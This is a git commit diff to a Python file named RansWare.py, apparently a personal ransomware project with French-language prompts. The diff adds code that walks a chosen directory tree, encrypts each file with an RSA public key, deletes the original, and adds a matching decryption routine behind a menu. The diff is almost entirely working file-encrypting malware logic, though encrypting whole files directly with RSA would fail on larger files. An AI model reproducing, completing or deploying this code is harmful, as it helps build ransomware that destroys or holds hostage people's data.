77b25023aee9a3204a62691a8248bdc5bf28cefc
Alexis Pondo <alexispondo23@gmail.com>
2022-02-11 07:37:07 +0000

    init7

--- RansWare.py
+++ RansWare.py
@@ -76,34 +76,78 @@ def ch(public_key, file):
         nf.write(ciphertext)
     os.remove(file)
 
+def dech(private_key, file):
+    with open(file, "rb") as f:
+        ciphertext = f.read()
+    plaintext = private_key.decrypt(
+        ciphertext,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
 
-def crypter(message):
+    new_file = "".join(str(file).split(".")[:-1])
+    with open(new_file, "wb") as nf:
+        nf.write(plaintext)
+    os.remove(file)
+
+
+def crypter(public_key_file):
     print(os.getcwd())
+    public_key = load_public_key(public_key_file)
     print("\nVous avez choisi de chiffrer les fichier du disque")
     print("Veuillez entrer le dossier racine à partir duquel les fichiers serons chiffrer de manière recursive")
     print("ex: D:\\my_dir\\, /home/user/dir/ ...")
     dir = str(input("Entrer le chemin du dossier > "))
     if os.path.isdir(dir):
-        os.chdir(dir)
-        print(os.getcwd())
+        #os.chdir(dir)
+        #print(os.getcwd())
 
         for (current_dir, list_dir, files) in os.walk(dir):
             for f in files:
-                print(current_dir + "/" + f)
-
+                path_file = current_dir + "/" + f
+                #try:
+                ch(public_key, path_file)
+                #except Exception as e:
+                #    pass
             #print((current_dir, list_dir, files))
     else:
         print("\nDésolé vous avez entrez un dossier inexistant :(")
 
-def decrypter(message_crypter):
-    pass
+def decrypter(private_key_file):
+    print(os.getcwd())
+    private_key = load_private_key(private_key_file)
+    print("\nVous avez choisi de dechiffrer les fichier du disque")
+    print("Veuillez entrer le dossier racine à partir duquel les fichiers sont chiffrer pour debuter le decryptage des fichiers")
+    print("ex: D:\\my_dir\\, /home/user/dir/ ...")
+    dir = str(input("Entrer le chemin du dossier > "))
+    if os.path.isdir(dir):
+        #os.chdir(dir)
+        #print(os.getcwd())
 
+        for (current_dir, list_dir, files) in os.walk(dir):
+            for f in files:
+                path_file = current_dir + "/" + f
+                try:
+                    dech(private_key, path_file)
+                except Exception as e:
+                    pass
+            #print((current_dir, list_dir, files))
+    else:
+        print("\nDésolé vous avez entrez un dossier inexistant :(")
 
 def main():
-    crypter("pondo")
+    choix = "1"
+    while choix != "q":
+        choix= input("1:crypter, 2:decrypter > ")
+        if choix == "1":
+            crypter("public_key")
+        elif choix == "2":
+            decrypter("private_key")
 
-
-#main()
+main()
 
 
 """
